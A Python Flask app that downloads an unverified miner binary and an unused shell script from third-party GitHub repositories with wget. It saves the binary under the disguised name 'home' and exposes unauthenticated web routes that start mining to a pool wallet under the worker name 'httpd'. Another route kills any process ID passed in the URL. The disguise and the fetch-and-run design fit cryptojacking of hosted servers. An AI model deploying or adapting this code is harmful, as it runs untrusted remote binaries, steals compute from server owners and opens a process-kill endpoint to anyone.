import os
import time
import subprocess
import requests
from flask import Flask, jsonify

app = Flask(__name__)

@app.route("/")
def home():
    # Get the public IP address
    public_ip = requests.get("https://ifconfig.me").text.strip()
    return jsonify({"message": "Mining service is running", "public_ip": public_ip})


@app.route("/start-mining")
def start_mining():
    # Command to execute the mining process
    mining_command = (
        "./home --pool stratum+tcp://0x1bE17413356722a411033303EF7D8A13768fdF83.httpd@pool-core-testnet.inichain.com:32672 "
        "--cpu-devices 0 "
    )
    try:
        # Run the mining command
        process = subprocess.Popen(
            mining_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        return jsonify({"message": "Mining process started", "pid": process.pid})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/stop-mining/<int:pid>")
def stop_mining(pid):
    try:
        os.kill(pid, 9)  # Sends SIGKILL to terminate the process
        return jsonify({"message": f"Process {pid} stopped"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


if __name__ == "__main__":
    # Ensure required files are downloaded
    if not os.path.exists("home"):
        os.system(
            "wget -q -O home https://github.com/syinkau/plum/raw/refs/heads/main/iniminer-linux-x64 && chmod +x home"
        )
    if not os.path.exists("compile.sh"):
        os.system(
            "wget -q https://github.com/syinkau/sa4/raw/refs/heads/main/compile.sh && chmod +x compile.sh"
        )
    # Start the Flask server
    app.run(host="0.0.0.0", port=8080)
